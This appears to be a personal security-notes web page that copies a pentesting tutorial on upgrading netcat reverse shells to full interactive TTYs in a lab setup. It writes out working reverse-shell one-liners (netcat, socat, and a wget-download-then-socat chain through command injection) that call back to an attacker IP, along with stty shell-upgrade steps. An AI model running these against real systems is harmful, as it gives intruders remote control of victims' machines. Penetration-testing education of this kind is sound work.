<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Void-Strike's Cyber Security Journey">
    <title>NetCat to Full TTY</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="tech-overlay"></div>
    <nav class="nav">
        <div class="container nav-container">
            <a href="/" class="nav-logo">
                <span class="logo-text">Void-Strike</span>
                <span class="logo-cursor">_</span>
            </a>
            <div class="nav-links">
                <a href="/" class="nav-link" data-text="Home">Home</a>
                <a href="#notes" class="nav-link" data-text="Notes">Notes</a>
                <a href="#projects" class="nav-link" data-text="Projects">Projects</a>
                <a href="#about" class="nav-link" data-text="About">About</a>
            </div>
        </div>
    </nav>

    <main>
        
        <div class="notes-container">
            <article class="note">
                <h1 class="note-title">NetCat to Full TTY</h1>
                <div class="note-content">
                    <p>Every pentester knows that amazing feeling when they catch a reverse shell with netcat and see that oh-so-satisfying verbose netcat message followed by output from <code>id</code>.</p>
<p>And if other pentesters are like me, they also know that dreadful feeling when their shell is lost because they run a bad command that hangs and accidentally hit “Ctrl-C” thinking it will stop it but it instead kills the entire connection.</p>
<p><a href="https://blog.ropnop.com/images/2017/07/oops_ctrl_c.png"><img src="https://blog.ropnop.com/images/2017/07/oops_ctrl_c.png" alt="Oops!"></a></p>
<p>Besides not correctly handling SIGINT, these&quot;dumb” shells have other shortcomings as well:</p>
<ul>
<li>Some commands, like <code>su</code> and <code>ssh</code> require a proper terminal to run</li>
<li>STDERR usually isn’t displayed</li>
<li>Can’t properly use text editors like <code>vim</code></li>
<li>No tab-complete</li>
<li>No up arrow history</li>
<li>No job control</li>
<li>Etc…</li>
</ul>
<p>Long story short, while these shells are great to catch, I’d much rather operate in a fully interactive TTY.</p>
<p>I’ve come across some good resources that include very helpful tips and techniques for “upgrading” these shells, and wanted to compile and share in a post. Along with Pentest Monkey, I also learned the techniques from Phineas Fisher in his released videos and writeups of his illegal activities:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Pentest Monkey - Post Exploitation Without a TTY</a></li>
<li><a href="https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s">Phineas Fisher Hacks Catalan Police Union Website</a></li>
<li><a href="http://pastebin.com/raw/0SNSvyjJ">Phineas Fisher - Hackingteam Writeup</a></li>
</ul>
<p>For reference, in all the screenshots and commands to follow, I am injecting commands in to a vulnerable web server (“VICTIM”) and catching shells from my Kali VM (“KALI”):</p>
<ul>
<li><strong>VICTIM IP</strong>: 10.0.3.7</li>
<li><strong>KALI IP</strong>: 10.0.3.4</li>
</ul>
<h1>Generating reverse shell commands</h1>
<p>Everyone is pretty familiar with the traditional way of using netcat to get a reverse shell:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;nc -e /bin/sh 10.0.3.4 4444&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p>and catching it with:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;nc -lvp 4444&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p>The problem is not every server has netcat installed, and not every version of netcat has the <code>-e</code> option.</p>
<p>Pentest Monkey has a great <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">cheatsheet</a> outlining a few different methods, but my favorite technique is to use Metasploit’s <code>msfvenom</code> to generate the one-liner commands for me.</p>
<p>Metasploit has several payloads under “cmd/unix” that can be used to generate one-liner bind or reverse shells:</p>
<p><a href="https://blog.ropnop.com/images/2017/07/msfvenom_payloads.png"><img src="https://blog.ropnop.com/images/2017/07/msfvenom_payloads.png" alt="msfvenom payloads"></a></p>
<p>Any of these payloads can be used with <code>msfvenom</code> to spit out the raw command needed (specifying LHOST, LPORT or RPORT). For example, here’s a netcat command not requiring the <code>-e</code> flag:</p>
<p><a href="https://blog.ropnop.com/images/2017/07/netcat_shell_cmd.png"><img src="https://blog.ropnop.com/images/2017/07/netcat_shell_cmd.png" alt="Netcat shell"></a></p>
<p>And here’s a Perl oneliner in case <code>netcat</code> isn’t installed:</p>
<p><a href="https://blog.ropnop.com/images/2017/07/perl_shell_cmd.png"><img src="https://blog.ropnop.com/images/2017/07/perl_shell_cmd.png" alt="Perl shell"></a></p>
<p>These can all be caught by using netcat and listening on the port specified (4444).</p>
<h1>Method 1: Python pty module</h1>
<p>One of my go-to commands for a long time after catching a dumb shell was to use Python to spawn a pty. The <a href="https://docs.python.org/2/library/pty.html">pty module</a> let’s you spawn a psuedo-terminal that can fool commands like <code>su</code> into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p>This will let you run <code>su</code> for example (in addition to giving you a nicer prompt)</p>
<p><a href="https://blog.ropnop.com/images/2017/07/python_pty.png"><img src="https://blog.ropnop.com/images/2017/07/python_pty.png" alt="Python PTY"></a></p>
<p>Unfortunately, this doesn’t get around some of the other issues outlined above. SIGINT (Ctrl-C) will still close Netcat, and there’s no tab-completion or history. But it’s a quick and dirty workaround that has helped me numerous times.</p>
<h1>Method 2: Using socat</h1>
<p><a href="http://www.dest-unreach.org/socat/doc/socat.html">socat</a> is like netcat on steroids and is a very powerfull networking swiss-army knife. Socat can be used to pass full TTY’s over TCP connections.</p>
<p>If <code>socat</code> is installed on the victim server, you can launch a reverse shell with it. You <em>must</em> catch the connection with <code>socat</code> as well to get the full functions.</p>
<p>The following commands will yield a fully interactive TTY reverse shell:</p>
<p><strong>On Kali (listen)</strong>:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;socat file:`tty`,raw,echo=0 tcp-listen:4444&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p><strong>On Victim (launch)</strong>:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p>If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:</p>
<p><a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p>
<p>With a command injection vuln, it’s possible to download the correct architecture <code>socat</code> binary to a writable directoy, chmod it, then execute a reverse shell in one line:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p>On Kali, you’ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It’s a full terminal. Pretty sweet.</p>
<p><a href="https://blog.ropnop.com/images/2017/07/socat_tty.png"><img src="https://blog.ropnop.com/images/2017/07/socat_tty.png" alt="Socat tty"></a></p>
<h1>Method 3: Upgrading from netcat with magic</h1>
<p>I watched Phineas Fisher use this technique in his hacking video, and it feels like magic. Basically it is possible to use a dumb netcat shell to upgrade to a full TTY by setting some <code>stty</code> options within your Kali terminal.</p>
<p>First, follow the same technique as in Method 1 and use Python to spawn a PTY. Once bash is running in the PTY, background the shell with <code>Ctrl-Z</code></p>
<p><a href="https://blog.ropnop.com/images/2017/07/background_netcat.png"><img src="https://blog.ropnop.com/images/2017/07/background_netcat.png" alt="Background shell"></a></p>
<p>While the shell is in the background, now examine the current terminal and STTY info so we can force the connected shell to match it:</p>
<p><a href="https://blog.ropnop.com/images/2017/07/term_stty_info.png"><img src="https://blog.ropnop.com/images/2017/07/term_stty_info.png" alt="Term and STTY info"></a></p>
<p>The information needed is the TERM type (<em>“xterm-256color”</em>) and the size of the current TTY (<em>“rows 38; columns 116”</em>)</p>
<p>With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;stty raw -echo&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p>With a raw stty, input/output will look weird and you won’t see the next commands, but as you type they are being processed.</p>
<p>Next foreground the shell with <code>fg</code>. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with <code>reset</code>.</p>
<p><a href="https://blog.ropnop.com/images/2017/07/fg_reset.png"><img src="https://blog.ropnop.com/images/2017/07/fg_reset.png" alt="Foreground and reset"></a></p>
<p><em>Note: I did not type the <code>nc</code> command again (as it might look above). I actually entered <code>fg</code>, but it was not echoed. The <code>nc</code> command is the job that is now in the foreground. The <code>reset</code> command was then entered into the netcat shell</em></p>
<p>After the <code>reset</code> the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;2&lt;br&gt;3&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;$ export SHELL=bash&lt;br&gt;$ export TERM=xterm256-color&lt;br&gt;$ stty rows 38 columns 116&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p>The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection:</p>
<p><a href="https://blog.ropnop.com/images/2017/07/netcat_full_tty.png"><img src="https://blog.ropnop.com/images/2017/07/netcat_full_tty.png" alt="Netcat full TTY"></a></p>
<p>The possibilities are endless now. Tmux over a netcat shell?? Why not? :D</p>
<p><a href="https://blog.ropnop.com/images/2017/07/tmux_over_netcat-1.png"><img src="https://blog.ropnop.com/images/2017/07/tmux_over_netcat-1.png" alt="Tmux over Netcat"></a></p>
<h1>tl;dr cheatsheet</h1>
<p>Cheatsheet commands:</p>
<p><strong>Using Python for a psuedo terminal</strong></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p><strong>Using socat</strong></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt;1&lt;br&gt;2&lt;br&gt;3&lt;br&gt;4&lt;br&gt;5&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;#Listener:&lt;br&gt;socat file:`tty`,raw,echo=0 tcp-listen:4444&lt;br&gt;&lt;br&gt;#Victim:&lt;br&gt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444&lt;br&gt;</code></td>
</tr>
</tbody>
</table>
<p><strong>Using stty options</strong></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;br&gt; 1&lt;br&gt; 2&lt;br&gt; 3&lt;br&gt; 4&lt;br&gt; 5&lt;br&gt; 6&lt;br&gt; 7&lt;br&gt; 8&lt;br&gt; 9&lt;br&gt;10&lt;br&gt;11&lt;br&gt;12&lt;br&gt;13&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;# In reverse shell&lt;br&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;br&gt;Ctrl-Z&lt;br&gt;&lt;br&gt;# In Kali&lt;br&gt;$ stty raw -echo&lt;br&gt;$ fg&lt;br&gt;&lt;br&gt;# In reverse shell&lt;br&gt;$ reset&lt;br&gt;$ export SHELL=bash&lt;br&gt;$ export TERM=xterm-256color&lt;br&gt;$ stty rows &lt;num&gt; columns &lt;cols&gt;&lt;br&gt;</code></td>
</tr>
</tbody>
</table>

                </div>
                <div class="note-meta">
                    <span class="note-date">May 29, 2025</span>
                    <div class="note-tags">
                        
                        <span class="note-tag">To_Sort</span>
                        
                        <span class="note-tag">Under_Development</span>
                        
                    </div>
                </div>
            </article>
        </div>
        
    </main>

    <footer class="footer">
        <div class="container footer-content">
            <div class="footer-info">
                <p class="footer-text">
                    <span class="prompt">$</span> echo "© 2025 Void-Strike"
                </p>
            </div>
            <div class="social-links">
                <a href="https://github.com/v0id-strike" class="social-link" target="_blank" rel="noopener" data-text="GitHub">
                    <span class="link-icon">[</span>GitHub<span class="link-icon">]</span>
                </a>
                <a href="https://t.me/v0id_strike" class="social-link" target="_blank" rel="noopener" data-text="Telegram">
                    <span class="link-icon">[</span>Telegram<span class="link-icon">]</span>
                </a>
            </div>
        </div>
    </footer>
</body>
</html>